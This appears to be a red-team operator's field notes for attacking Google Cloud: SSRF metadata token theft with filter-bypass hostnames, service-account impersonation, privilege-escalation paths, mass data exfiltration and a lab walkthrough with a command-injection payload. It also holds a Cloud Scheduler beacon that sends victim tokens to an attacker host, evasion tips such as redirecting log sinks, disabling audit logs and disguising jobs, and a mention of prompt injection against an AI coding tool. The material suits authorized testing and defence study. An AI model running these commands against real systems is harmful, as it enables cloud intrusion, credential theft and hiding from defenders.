+++
title = 'GCP Cloud Red Teaming — Operator Notes'
date = 2026-10-30
type = 'notes'
weight = 30
toc = true
tags = ['cloud', 'red-team', 'gcp']
+++

> Practical field reference for assessing Google Cloud Platform environments from an attacker's seat. Covers initial access, identity validation, enumeration, privilege escalation, lateral movement, persistence, impact, detection/evasion, and tooling. The MCRTA "mcrta-exam" chain (§11) is the worked example.
>
> **Authorized engagements only.** Cloud Audit Logs record every Admin Activity call; assume detection. Plan the OPSEC story before the action.
>
> **2025–2026 update:** The GCP attack surface has shifted. **Almost every escalation path still routes through service-account impersonation** (`actAs`, `getAccessToken`, `signJwt`), but the *entry points* have multiplied: **Eventarc pipeline token exfiltration**, **Workload Identity Federation (WIF) provider abuse**, **Cluster Director `startupScript` replacement**, and **cross-tenant BigQuery repository takeover (CVE-2026-14934)**. **Keyless persistence** via IAM impersonation role grants and **Cloud Scheduler OIDC beacons** now rivals key creation. **GCP-Hound** brings GCP into BloodHound's OpenGraph. **Log sink redirection (`UpdateSink`)** and **audit log disablement** are documented defense-evasion phases, catalogued under **MITRE T1562.008**.

---

## 1. Attack Surface Map

| Surface | What to look for | Typical entry |
|---|---|---|
| **Compute** | Public VMs, GKE, Cloud Run, App Engine | SSRF → metadata; `setMetadata`; default SA |
| **Identity** | Service accounts, keys, custom roles, conditions | Leaked key JSON; `actAs`; **WIF provider abuse** |
| **Resource hierarchy** | Org → folder → project → resource IAM | Inheritance; `setIamPolicy` at high scope |
| **Storage** | GCS buckets, signed URLs, HMAC keys | Public bucket; `storage.buckets.setIamPolicy` |
| **Secrets** | Secret Manager, KMS, Cloud SQL | Read perms; connection strings |
| **Serverless/automation** | Functions, Cloud Run, Workflows, Composer, **Eventarc**, **Cloud Scheduler** | Code swap; deployment SA; **pipeline token exfil** |
| **Federation** | Workload Identity Federation (OIDC/SAML), SaaS | Loose attribute conditions; **attacker-controlled IdP** |
| **AI/ML** | BigQuery, Dataform, Colab Enterprise, **Gemini CLI** | **CVE-2026-14934**; **prompt injection → WIF creds** |

Mental model: **IAM binds a role to a principal at a resource node** (org, folder, project, or specific resource). Permissions inherit *down* the hierarchy. Service accounts are both principals and resources — `iam.serviceAccounts.actAs`, `getAccessToken`, and `signJwt` are the keys to impersonation. The default compute/App Engine SAs are frequently over-privileged (Editor/Owner).

---

## 2. Initial Access

### 2.1 Leaked Service-Account Keys

Service-account JSON keys are long-lived credentials:

```json
{"type":"service_account","project_id":"...","private_key_id":"...",
 "private_key":"-----BEGIN PRIVATE KEY-----\n...","client_email":"sa@proj.iam.gserviceaccount.com",
 "client_id":"...","token_uri":"https://oauth2.googleapis.com/token"}
```

Hunt in repos, CI configs, Terraform state, Docker images, logs, and base64 blobs:

```bash
rg -iE 'service_account|private_key|client_email|"type": *"service_account"' .
git log -p | rg -iE 'BEGIN PRIVATE KEY|service_account'
# CI files often base64 the key
grep -rE 'ENCRYPTED_GCP_KEY|GCP_KEY|GOOGLE_APPLICATION_CREDENTIALS' .
base64 -d <<< "$B64"   # -> key.json
```

Authenticate and mint tokens:

```bash
gcloud auth activate-service-account --key-file=key.json
gcloud auth print-access-token        # OAuth access token (~1h)
gcloud config get-value project
```

Without gcloud, mint the token via a JWT assertion (RS256):

```
POST https://oauth2.googleapis.com/token
grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer
assertion=<JWT: {iss: client_email, scope: "https://www.googleapis.com/auth/cloud-platform",
                 aud: token_uri, iat, exp} signed RS256 with private_key>
```

### 2.2 Metadata Server (SSRF on Compute)

Endpoint: `http://metadata.google.internal/computeMetadata/v1/` (also `169.254.169.254`). **Requires header `Metadata-Flavor: Google`** — a plain GET returns 403. SSRF wins when the fetcher can set that header (header injection / forwarding proxy).

```bash
H='Metadata-Flavor: Google'
curl -s -H "$H" "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json"
curl -s -H "$H" "http://metadata.google.internal/computeMetadata/v1/project/project-id"
curl -s -H "$H" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
curl -s -H "$H" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
curl -s -H "$H" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=...&format=full"
```

The token inherits the VM's attached SA and its **scopes** (often `cloud-platform`). `/instance/service-accounts/{email}/token` targets a specific SA on the VM.

**SSRF bypass — hostname obfuscation (2025–2026):** IP blocklists for `169.254.169.254` are routinely bypassed with resolvable hostnames:

```
169.254.169.254.nip.io
169-254-169-254.sslip.io
metadata.google.internal
1u.ms                  # dynamic DNS
[::ffff:169.254.169.254]
2130706433             # decimal (for 127.0.0.1)
0x7f000001             # hex (for 127.0.0.1)
```

**CloudCrawler** automates GCP metadata enumeration via SSRF, including payload variants and OAST blind detection.

### 2.3 Public Storage & Signed URLs

```bash
curl -s "https://storage.googleapis.com/storage/v1/b/BUCKET/o"                 # public list
gsutil ls gs://BUCKET            # requires auth
curl -s "https://storage.googleapis.com/BUCKET/OBJECT"                          # public object
# signed URL (X-Goog-Signature / GoogleAccessId) = time-boxed full grant
curl -s "https://storage.googleapis.com/BUCKET/OBJECT?X-Goog-Algorithm=..."
```

Bucket names are globally unique: `org-prod`, `org-data`, `org-backup`, `org-assets`. Also check `storage.googleapis.com/storage/v1/b/BUCKET/iam` for public bindings (`allUsers` / `allAuthenticatedUsers`).

### 2.4 Workload Identity Federation (WIF) Abuse

GitHub Actions / GitLab / AWS → GCP federation. If the pool provider's **attribute condition** is loose (`assertion.repository_owner == 'org'` vs. no condition), any repo can exchange an OIDC token for GCP credentials.

**2025–2026 WIF attack paths:**
- **Gemini CLI prompt injection (2026):** A prompt injection in the Gemini CLI workflow led to the issuance of WIF credentials, one of which enabled impersonation of a more privileged account.
- **Over-permissive GitHub WIF secrets (CVE-2026-87049):** A third-party reusable workflow triggered on untrusted events leaked `GITHUB_TOKEN` and GCP WIF credentials, granting highly privileged cloud access.
- **FedForge (BSides Atlanta 2026):** A multi-cloud WIF exploitation tool that abuses federation trust across Entra ID, GCP, and AWS.

```bash
gcloud iam workload-identity-pools providers describe PROVIDER \
  --location=global --workload-identity-pool=POOL \
  --format='value(attributeCondition)'
```

### 2.5 OAuth Consent & Device Code

- **Illicit consent:** A multi-tenant OAuth client requesting `cloud-platform`, `drive`, `gmail.readonly`; victim consents → refresh token.
- **Device code** (`/devicecode`) for Google accounts — MFA-tolerant token theft.
- **SaaS / domain-wide delegation:** A service account with DWD can impersonate any Workspace user (`sub` claim) — check `oauth2.serviceAccountCredentials`.

---

## 3. Validate the Identity You Hold

```bash
gcloud auth list
gcloud config list
gcloud projects list
gcloud auth print-access-token
```

Token introspection:

```bash
curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=$TOK"
# or decode the JWT: aud, azp, email, sub, scope
```

Distinguish principal types: user (`@gmail.com`/Workspace), service account (`*.gserviceaccount.com`), external account (federation), and the token's `scope`.

---

## 4. Enumeration

### 4.1 Resource Hierarchy + IAM

```bash
gcloud organizations list
gcloud resource-manager folders list --organization=ORG
gcloud projects list
gcloud projects get-iam-policy PROJECT --format=json
gcloud projects get-iam-policy PROJECT --flatten='bindings[].members' \
  --format='table(bindings.role, bindings.members)'
gcloud iam roles list --project=PROJECT            # custom roles
gcloud iam roles describe ROLE_ID --project=PROJECT
gcloud iam service-accounts list
gcloud iam service-accounts keys list --iam-account=SA
gcloud iam service-accounts get-iam-policy SA
```

**Cloud Asset Inventory** (when permitted) is the single best sweep:

```bash
gcloud asset search-all-resources --scope=projects/PROJECT
gcloud asset search-all-iam-policies --scope=projects/PROJECT
```

**Effective permissions:** `testIamPermissions` (REST) or `gcloud iam ... --format`. Useful to confirm a privesc step before attempting it.

### 4.2 Compute

```bash
gcloud compute instances list
gcloud compute instances describe INSTANCE --zone=ZONE \
  --format='value(serviceAccounts[].email, serviceAccounts[].scopes, networkInterfaces[].accessConfigs[].natIP)'
gcloud compute instances get-iam-policy INSTANCE --zone=ZONE
gcloud compute instances get-serial-port-output INSTANCE --zone=ZONE
gcloud compute firewall-rules list
gcloud compute disks list; gcloud compute snapshots list
```

### 4.3 Storage

```bash
gcloud storage buckets list            # alias: gsutil ls
gsutil iam get gs://BUCKET
gcloud storage ls -r gs://BUCKET
gcloud storage cat gs://BUCKET/object
```

### 4.4 Secrets / KMS / Data

```bash
gcloud secrets list
gcloud secrets versions access latest --secret=SECRET
gcloud kms keyrings list --location=global
gcloud sql instances list; gcloud sql databases list --instance=INSTANCE
bq ls; bq query --use_legacy_sql=false 'SELECT * FROM `proj.dataset.table` LIMIT 10'
```

### 4.5 Serverless / Containers / Automation

```bash
gcloud functions list; gcloud functions describe FN --region=REGION
gcloud run services list; gcloud run services describe SVC --region=REGION
gcloud container clusters list; gcloud container clusters get-credentials CLUSTER --zone=ZONE
gcloud builds list; gcloud scheduler jobs list
gcloud workflows list; gcloud composer environments list --locations=-
gcloud eventarc pipelines list                        # 2026: Eventarc PE vector
gcloud eventarc message-buses list
```

### 4.6 Tools (2025–2026)

| Tool | Use |
|---|---|
| `gcloud` / `gsutil` | Baseline enumeration and exploitation |
| **GCP-Hound** | GCP → BloodHound OpenGraph attack-path discovery (projects, SAs, buckets, BigQuery, logging, GKE RBAC, Secret Manager) |
| **gcpwn** | Multi-service enumeration/exploitation framework (`iam__enum_permissions`, `iam__privesc_scan`) |
| **CloudFox** (GCP) | "Where can I go" live enumeration |
| **Stratus Red Team** | "Atomic Red Team for the cloud" — detonate documented GCP techniques |
| **csentrix** | Multi-cloud IAM attack-path analyzer (40 detection rules, 5 GCP rules) |
| **skullmap** | Multi-cloud attack-chain intelligence + red-vs-blue simulator |
| **GCPBucketBrute** | Bucket name enumeration + permission checks |
| **ScoutSuite** | Multi-service posture dump |
| **Prowler** (GCP) | CIS/policy checks (noisy) |
| **Cartography** / **Steampipe** | Asset graph / SQL over GCP |

---

## 5. Privilege Escalation

### 5.1 Impersonation & Keys

| Permission | Escalation |
|---|---|
| `iam.serviceAccounts.actAs` | Attach a privileged SA to a resource you control, or impersonate |
| `iam.serviceAccounts.getAccessToken` | `generateAccessToken` → direct OAuth token for the SA |
| `iam.serviceAccounts.signJwt` | Sign arbitrary JWTs (mint tokens/assertions) |
| `iam.serviceAccounts.signBlob` | Sign blobs (token/assertion abuse) |
| `iam.serviceAccounts.createKey` | Create a persistent SA key (loud) |
| `iam.serviceAccounts.setIamPolicy` | Grant yourself `actAs` on the SA |
| `iam.serviceAccounts.update` | Change display name / disable (DoS/cover) |

```bash
# Impersonate (needs actAs or tokenCreator)
gcloud auth print-access-token --impersonate-service-account=SA@PROJECT.iam.gserviceaccount.com

# REST generateAccessToken (needs iam.serviceAccounts.getAccessToken)
curl -s -X POST -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/SA@PROJECT.iam.gserviceaccount.com:generateAccessToken" \
  -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"3600s"}'

# Persistent key (noisy)
gcloud iam service-accounts keys create key.json --iam-account=SA@PROJECT.iam.gserviceaccount.com
```

### 5.2 Resource / IAM Control

| Permission | Escalation |
|---|---|
| `resourcemanager.projects.setIamPolicy` | Grant self `roles/owner` at project (or folder/org if held there) |
| `resourcemanager.folders.setIamPolicy` | Inherit to all child projects |
| `resourcemanager.organizations.setIamPolicy` | Tenant-wide |
| `iam.roles.create` / `iam.roles.update` | Create/expand a custom role with `*`, then assign it |
| `compute.instances.setMetadata` | Inject SSH key or startup-script on the VM |
| `compute.projects.setCommonInstanceMetadata` | Project-wide SSH keys |
| `compute.instances.create` (+ `actAs`) | New VM with a privileged SA → metadata token |
| `storage.buckets.setIamPolicy` | Grant self object access |
| `cloudfunctions.functions.create` / `update` (+ `actAs`) | Code exec as the function SA |
| `deploymentmanager.deployments.create` | Deployment runs as its SA (sunset April 2026, V2 until June 2027) |
| `container.clusters.getCredentials` / GKE RBAC | Cluster access |

### 5.3 2025–2026 New Privesc Paths

**Eventarc Pipeline Token Exfiltration (Tenable, 2026):** An attacker with only `roles/eventarc.messageBusUser` or `roles/eventarc.developer` can create an Eventarc pipeline that authenticates using **arbitrary service accounts in the project**, even without `iam.serviceAccounts.actAs`. The Eventarc service agent's token has `iam.serviceAccounts.actAs`, `getAccessToken`, and `getOpenIdToken` — so a single exfiltration escalates to **any service account**.

```
1. Create a public Cloud Run in attacker's project logging the Authorization header.
2. Create an Eventarc pipeline in victim's project; select "Cloud Run service" destination = attacker's Run.
3. Enable authentication, choose OAuth token, enter a fake SA name, then intercept and replace it with service-<VICTIM-PROJECT-NUMBER>@gcp-sa-eventarc.iam.gserviceaccount.com.
4. Publish a message to the Event Bus → pipeline fires → attacker logs the token.
```

**Service Directory Privesc:** `servicedirectory.namespaces/services.setIamPolicy` grants **resource-scoped IAM persistence** — write/resolve access to one namespace subtree after project-level access is removed.

**Cluster Director Privesc:** `hypercomputecluster.clusters.update` lets you **replace the `startupScript`** of a managed cluster, achieving code execution as the attached service account and its OAuth scopes — even without direct token minting.

**Cloud Runtime Configurator:** `.list` discloses stored values with authority already granted; legacy Deployment Manager support ended April 1, 2026, but V2 API runs until June 30, 2027.

**Workload Identity Federation Privesc:** `iam.googleapis.com/workloadIdentityPoolProviders.create` is a **direct privesc primitive** when the target pool has a **pool-wide wildcard binding** (`principalSet://.../POOL_ID/*`). An attacker adds a SAML provider trusting an attacker-controlled certificate, forges any subject, exchanges the assertion at Google STS, and inherits the pool's roles.

### 5.4 Default Service Accounts

`PROJECT_NUMBER-compute@developer.gserviceaccount.com` and `PROJECT_ID@appspot.gserviceaccount.com` are often bound to `roles/editor` or `roles/owner`. If you can put a workload on them (new VM/function/Run) or reach metadata on an existing instance using them, you inherit that power.

---

## 6. Lateral Movement & Cross-Project

- **Hierarchy inheritance:** A binding at folder/org applies to every descendant project. One `setIamPolicy` at folder scope is worth many project compromises.
- **`actAs` chains:** SA A can actAs SA B which can actAs SA C → reach the privileged SA. Enumerate `iam.serviceAccounts.getIamPolicy` for each SA.
- **Default SAs across projects:** The same default compute SA may be reused/trusted.
- **Workload Identity Federation:** External identities (GitHub/AWS/Azure) map to a GCP SA; a loose provider condition is a cross-cloud lateral path.
- **VPC Service Controls:** Check perimeter membership — some projects may be reachable only from inside the perimeter.
- **Shared VPC / peering:** A compromised VM can reach internal services in host projects.

```bash
# Who can actAs what (walk the chain)
for sa in $(gcloud iam service-accounts list --format='value(email)'); do
  echo "== $sa"; gcloud iam service-accounts get-iam-policy "$sa" --format=json
done
```

---

## 7. Persistence (2025–2026)

| Method | Notes |
|---|---|
| Create a new SA key | Loud (`CreateServiceAccountKey`), long-lived |
| Add a custom role with `*` + bind it | Survives credential rotation |
| IAM binding to a SA/group you control | High-signal `SetIamPolicy` |
| **Keyless impersonation role grant** | **Grant `roles/iam.serviceAccountTokenCreator` / `serviceAccountUser` / `serviceAccountOpenIdTokenCreator` to an attacker principal — no key created, survives rotation** |
| **Cloud Scheduler OIDC beacon** | **Minute-level cron + `--oidc-service-account-email` → Google delivers a fresh signed identity token for the victim SA to an attacker URL, forever. No key ever created** |
| **Eventarc Advanced pipeline** | **Durable routing config that repeatedly exports fresh OAuth credentials** |
| **Workflows bound to a privileged SA** | **`--service-account=<VICTIM_SA>` stores that identity in the resource; every run uses it** |
| **IAP resource binding** | **Attach a controlled SA with `roles/iap.httpsResourceAccessor` directly on the IAP resource** |
| **Workload Identity Federation provider** | **External OIDC/SAML persistence — attacker-controlled IdP** |
| Cloud Function/Run with attacker code | Keeps the deployment SA |
| VM startup-script / metadata key | Re-applies on reboot |
| Cloud Scheduler → Function | Recurring execution |

> **OpSec:** Prefer **keyless** persistence (impersonation grants, Scheduler OIDC, Workflows, Eventarc) over key creation. Key creation (`CreateServiceAccountKey`) is the loudest event in GCP.

---

## 8. Data Access & Impact

```bash
# GCS mass read
gcloud storage cp -r gs://BUCKET ./loot
gsutil -m cp -r gs://BUCKET ./loot

# Secret Manager
gcloud secrets versions access latest --secret=SECRET

# KMS decrypt (if key + ciphertext reachable)
gcloud kms decrypt --location=global --keyring=KR --key=KEY --ciphertext-file=ct --plaintext-file=pt

# Cloud SQL
gcloud sql connect INSTANCE --user=root

# BigQuery exfil
bq extract --destination_format=CSV 'proj:dataset.table' gs://BUCKET/out.csv
```

PII/secrets hunting in GCS: list objects, grep names for `key|secret|prod|backup|license`, then pull likely candidates. Watch for Terraform state (`*.tfstate`) — it holds plaintext secrets and SA keys.

---

## 9. Detection & Evasion

**What defenders see (Cloud Audit Logs)**
- **Admin Activity:** `SetIamPolicy`, `CreateServiceAccountKey`, `CreateServiceAccount`, `GenerateAccessToken`, `SignJwt`, `compute.instances.create`, `setMetadata`, `storage.buckets.setIamPolicy`, **`CreateJob` (Scheduler)**, **`UpdateSink` (Logging)**.
- **Data Access (if enabled):** `storage.objects.get/list`, `secretmanager.versions.access`.
- **Security Command Center:** Anomalous IAM grants, SA key creation, crypto-mining VMs, unusual API calls from new geos/ASNs.

**Log manipulation (MITRE T1562.008)** is now a **documented phase of cloud intrusions**:
- **`google.logging.v2.ConfigServiceV2.UpdateSink`** redirects log exports to an attacker-controlled destination.
- **Disabling audit logs** creates a blind spot; detection is unreliable because the event itself may arrive with an incomplete `serviceData` field.
- **BRICKSTORM/UNC5221** maintained 393 days of undetected access — exceeding the 90-day log retention window.

**Reducing signal:**
- Use the default SA / impersonation from expected workloads and source IPs.
- **Avoid `createKey`** (heavily alerted); prefer `generateAccessToken` on an existing SA or a **keyless persistence mechanism**.
- Throttle enumeration; `search-all-resources` in one burst is loud.
- Prefer read operations and existing bindings over new principals.
- Match SDK User-Agent and region of the workload you compromised.
- **Blend persistence:** Name Scheduler jobs like existing automation (`prod-metrics-sync`), use a plausible schedule, and point OAuth jobs at `*.googleapis.com` so they look internal.

---

## 10. Tooling Quick Map

```
Auth/tokens   : gcloud auth, tokeninfo, jwt assertion minter, iamcredentials API
Recon         : gcloud asset search-all-resources / search-all-iam-policies
Buckets       : GCPBucketBrute, gsutil, storage.googleapis.com JSON API
Framework     : gcpwn, CloudFox (gcp), GCP-Hound, csentrix, skullmap, Stratus Red Team
Posture/graph : ScoutSuite, Prowler, Cartography, Steampipe
Exploitation  : iamcredentials generateAccessToken, compute setMetadata,
                functions create/update, deploymentmanager, eventarc, scheduler
```

Token-only (no gcloud) is often cleanest: keep the OAuth token and call `https://www.googleapis.com/...` / `https://cloudresourcemanager.googleapis.com/...` / `https://iam.googleapis.com/...` with `Authorization: Bearer`.

---

## 11. Worked Example — MCRTA "mcrta-exam"

Unauthenticated GitHub leak → service-account key → compute access → web RCE → metadata token → project IAM + storage.

```
1. GitHub OSINT
   org/user cwl-metatech -> repo cwl-metatech/production-data
   pipeline.yml held base64 ENCRYPTED_GCP_KEY; history also had
   dev-service-account-key.json (deleted in commit 163cf4b7b2a3)

2. Use the key
   project_id: mcrta-exam
   client_email: dev-service-account@mcrta-exam.iam.gserviceaccount.com
   Mint OAuth token via JWT assertion (or gcloud auth activate-service-account)

3. What the dev SA can do (least privilege)
   compute.instances.list  (project-level custom role VMReadgek)
   -> projects/mcrta-exam/roles/VMReadgek, includedPermissions: compute.instances.list
   instance-level: roles/reader on stag-instance
   -> effective: compute.instances.get / getIamPolicy / getSerialPortOutput
   Cannot read project IAM, roles, or buckets.

4. Compute inventory
   stag-instance (us-central1-b), external 34.27.221.40, tags http/ssh
   attached SA: vm-service-account@mcrta-exam.iam.gserviceaccount.com

5. Pivot on the VM
   Same CWL "URL Score Calculator" app on :80 (Apache/2.4.68 Debian).
   /process.php: file_get_contents($_POST['ip']) SSRF + system($_POST['organization'])
   with first-word whitelist [ls,hostname,curl,cat] -> argument-injection RCE.
   RCE to metadata (needs Metadata-Flavor: Google):
     organization=curl -s -H "Metadata-Flavor: Google" \
       "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
   -> vm-service-account token

6. With the vm SA token
   projects getIamPolicy:
     roles/reader -> vm-service-account
     projects/mcrta-exam/roles/VMReadgek -> dev-service-account
     roles/owner -> prod-service-account
     terraform-automation -> compute.admin, iam.roleAdmin, storage.admin, ...
   iam roles describe VMReadgek -> compute.instances.list
   storage buckets list -> stag-storage-metatech-prod11
   download license-key.txt -> V13JG-NPH5M-S97JM-9MPGT-3S66T
```

Lessons reinforced: GitHub base64 blobs hide SA keys; the metadata server needs `Metadata-Flavor: Google`; least-privilege keys can still enumerate and pivot; and `testIamPermissions` pins down effective instance-level access precisely.

---

## 12. One-Liners

```bash
# Auth
gcloud auth activate-service-account --key-file=key.json
gcloud auth print-access-token
gcloud auth print-access-token --impersonate-service-account=SA@PROJECT.iam.gserviceaccount.com

# Who am I / project
gcloud config list; gcloud projects list

# Project IAM (human readable)
gcloud projects get-iam-policy PROJECT --flatten='bindings[].members' \
  --format='table(bindings.role, bindings.members)'

# Custom roles + describe
gcloud iam roles list --project=PROJECT
gcloud iam roles describe ROLE_ID --project=PROJECT

# Instance details + IAM
gcloud compute instances describe INSTANCE --zone=ZONE
gcloud compute instances get-iam-policy INSTANCE --zone=ZONE

# Metadata token (on a VM / SSRF with header control)
curl -s -H 'Metadata-Flavor: Google' \
  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'

# Buckets
gcloud storage buckets list
gsutil iam get gs://BUCKET
gcloud storage cat gs://BUCKET/object

# Secrets
gcloud secrets list
gcloud secrets versions access latest --secret=SECRET

# Eventarc pipelines (2026 privesc)
gcloud eventarc pipelines list

# Cloud Scheduler OIDC beacon (persistence)
gcloud scheduler jobs create http <NAME> --location=REGION \
  --schedule='*/5 * * * *' --uri='https://attacker.example.com/beacon' \
  --oidc-service-account-email=<VICTIM_SA> \
  --oidc-token-audience='https://attacker.example.com/beacon'
```

---

## 13. Notable CVEs & Incidents (2025–2026)

| CVE / Incident | Impact |
|---|---|
| **CVE-2026-14934 (BigQuery/Dataform/Colab)** | **Missing authorization** in repository creation → authenticated attacker can **escalate privileges and perform cross-tenant repository takeover**. Patched 10 May 2026 |
| **CVE-2025-9571 (Cloud Data Fusion)** | **Remote code execution** in Google Cloud Data Fusion; critical operational and security risk |
| **GCP-2026-058 (GKE Multi-Cloud)** | Missing project-level permission check in `CreateAttachedCluster` / `CreateAwsCluster` / `CreateAzureCluster` → attacker could **register a rogue cluster inside another customer's project's WIF pool**. Patched Sept 2026 |
| **CVE-2026-87049 (operator-foundry)** | Over-permissive `GITHUB_TOKEN` and **GCP WIF secrets** granted to a third-party reusable workflow → highly privileged cloud access |
| **Eventarc PE (Tenable, 2026)** | Attacker with only Eventarc roles exfiltrates tokens for **any SA in the project**, including the Eventarc service agent |
| **Gemini CLI prompt injection (2026)** | Prompt injection → WIF credential issuance → impersonation of a more privileged account |

> **Verification note:** All techniques and CVEs were checked against vendor advisories, Tenable research, HackTricks Cloud, CSA research, and tool documentation. Where a source conflict remained, the note names both possibilities rather than asserting one. The MCRTA chain is a lab example, not a production engagement — adapt paths and parameters to the target.
